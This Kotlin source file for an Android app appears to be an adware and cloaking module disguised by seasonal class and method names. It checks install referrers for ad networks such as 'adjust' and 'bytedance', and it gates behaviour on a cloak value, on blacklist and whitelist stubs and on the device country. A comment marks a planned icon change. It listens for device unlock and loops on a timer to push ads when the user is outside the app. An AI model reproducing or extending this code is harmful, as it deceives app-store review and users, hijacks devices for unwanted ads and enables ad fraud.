package com.autumn.leaves

import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.PowerManager
import com.autumn.leaves.flows.AcornBroadcast
import com.autumn.leaves.flows.CrispFlows
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.Locale

/**
 * Date：2024/7/1
 * Describe:
 */

class CozyApple(val context: Context, val leaversCache: LeaversCache) {
    private var mAutumnL by AppleCache(nameP = "autumn_length")

    private var scopeMain: CoroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    private var isWaitInstallSuccess = false
    private var mCozyJob: Job? = null
    private val isAreaCountryCozy: Boolean
        get() = arrayListOf(
            "SG", "US", "IN", "KE"
        ).find { it == Locale.getDefault().country } != null

    private var isActionAutumn = false

    fun registerCozy() {
        mCozyJob = CoroutineScope(Dispatchers.Default).launch {
            CrispFlows.flowLevel.collect {
                WindHelper.log("registerCozy---$it")
                when (it) {
                    "Spring" -> {
                        springAction()
                    }

                    "Summer" -> {
                        summerAction()
                    }

                    "Autumn" -> {
                        if (isActionAutumn.not()) {
                            isActionAutumn = true
                            if (isWaitInstallSuccess) {
                                CrispFlows.isStop = true
                                mCozyJob?.cancel()
                            }
                            autumnAction()
                        }
                    }

                    "wait_finish" -> {
                        isWaitInstallSuccess = true
                        if (isActionAutumn) {
                            CrispFlows.isStop = true
                            mCozyJob?.cancel()
                        }
                    }

                    "Winter1", "Winter2" -> {
                        CrispFlows.isStop = true
                    }
                }
            }
        }
    }

    private fun springAction() {
        if (WindHelper.mReferrer.isNotBlank()) {
            ArrayList(CrispFlows.listStr).forEach {
                if (isAreaCountryCozy.not() || it == "adjust" || it == "bytedance") {
                    if (WindHelper.mReferrer.contains(it)) {
                        postUseE(it)
                        return
                    }
                }
            }
        }

        if (CrispFlows.autumnUser()) {
            postUseE("adjust")
            return
        }
        if (CrispFlows.mNetworkStr.isNotBlank() && WindHelper.mReferrer.isNotBlank() && WindHelper.mCloakInfo.isNotBlank()) {
            CrispFlows.curCrispLevel = "Winter1"
        }
    }

    private fun postUseE(string: String) {
        WindHelper.eventPost("isuser", mapOf("getstring" to string))
        CrispFlows.curCrispLevel = "Summer"
        summerAction()
    }

    private fun summerAction() {
        if (winterU()) {
            CrispFlows.curCrispLevel = "Winter2"
        } else if (autumnW()) {
            CrispFlows.curCrispLevel = "Autumn"
            WindHelper.eventPost("ishit")
        }
    }

    private fun winterU(): Boolean {
        // todo  黑名单
        return WindHelper.mCloakInfo == ""
    }


    private fun autumnW(): Boolean {
        // todo  白名单
        return WindHelper.mCloakInfo == ""
    }

    private var mTimerRequest = true

    private fun autumnAction() {
        if (mAutumnL.length > 100) {
            return
        }
        CoroutineScope(Dispatchers.Main).launch {
            WindHelper.setEventNumToMax()
            // todo 换icon
            CrispFlows.crispEvent(context, "")

            context.registerReceiver(AcornBroadcast(), IntentFilter().apply {
                addAction(Intent.ACTION_USER_PRESENT)
            })

            launch {
                CrispFlows.globalFlow.collect {
                    WindHelper.log("log--->$it")
                    when (it) {
                        "broadcast" -> {
                            if (mAutumnL.length < 100) {
                                WindHelper.eventPost("time_charge")
                                action(true)
                            }
                        }

                        "star_up" -> {
                            WindHelper.eventPost("startup")
                            mAutumnL = ""
                        }

                        "adLoadSuccess" -> action(false)
                        "adNotReady" -> {
                            lastShowSuccessTime = 0
                        }
                    }
                }
            }

            while (mTimerRequest) {
                CrispFlows.globalFlow.emit("load_leavers")
                WindHelper.eventPost("time")
                action(false)
                WindHelper.timeCheckDelay()
            }
        }
    }

    private var lastShowSuccessTime = 0L

    private fun action(isBro: Boolean) {
        WindHelper.log("action--->$mAutumnL")
        if (mAutumnL.length > 100) {
            mTimerRequest = false
            WindHelper.eventPost("jumpfail")
            return
        }
        if (isDeviceLockInfo(context).not()) return
        WindHelper.eventPost("isunlock")

        if (isWaitInstallSuccess.not()) return
        if (WindHelper.windStatus.contains("a_s_pp", true)) return
        if (isBro.not() && System.currentTimeMillis() - lastShowSuccessTime < WindHelper.timeShowPAutumn) return

        WindHelper.eventPost("ispass")

        scopeMain.launch {
            lastShowSuccessTime = System.currentTimeMillis()
            if (leaversCache.isCanUse() != null) {
                WindHelper.eventPost("isready")
                CrispFlows.globalFlow.emit("finishAndShow")
            } else {
                leaversCache.loadAndTry()
            }
        }

    }

    //DeviceNotLocked
    private fun isDeviceLockInfo(context: Context): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }


}